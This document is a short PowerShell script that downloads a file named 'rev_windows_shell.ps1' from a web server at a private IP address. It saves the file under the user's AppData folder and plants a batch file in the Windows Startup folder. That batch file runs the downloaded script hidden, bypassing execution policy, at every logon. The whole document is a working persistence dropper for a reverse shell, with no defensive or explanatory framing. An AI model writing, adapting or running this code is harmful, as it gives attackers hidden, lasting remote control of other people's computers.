# Define URLs and directories
$url = "http://192.168.197.130:9090/rev_windows_shell.ps1"
$scriptDir = [System.IO.Path]::Combine($env:APPDATA, "Scripts")
$startupDir = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
$filePath = "$scriptDir\rev_windows_shell.ps1"
$batFilePath = "$startupDir\run_hidden.bat"

# Create Scripts directory if it doesn’t exist
if (-not (Test-Path $scriptDir)) {
    New-Item -Path $scriptDir -ItemType Directory | Out-Null
}

# Download the PowerShell script to Scripts folder
Invoke-WebRequest -Uri $url -OutFile $filePath

# Create the BAT file content to run the PS1 script silently
$batContent = "@echo off`r`n" +
              "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$filePath`""

# Save the BAT file to Startup folder
$batContent | Out-File -Encoding ASCII -FilePath $batFilePath

# Optional: Test the BAT file immediately (remove this line for silent deployment)
# Start-Process "cmd.exe" -ArgumentList "/c `"$batFilePath`"" -WindowStyle Hidden
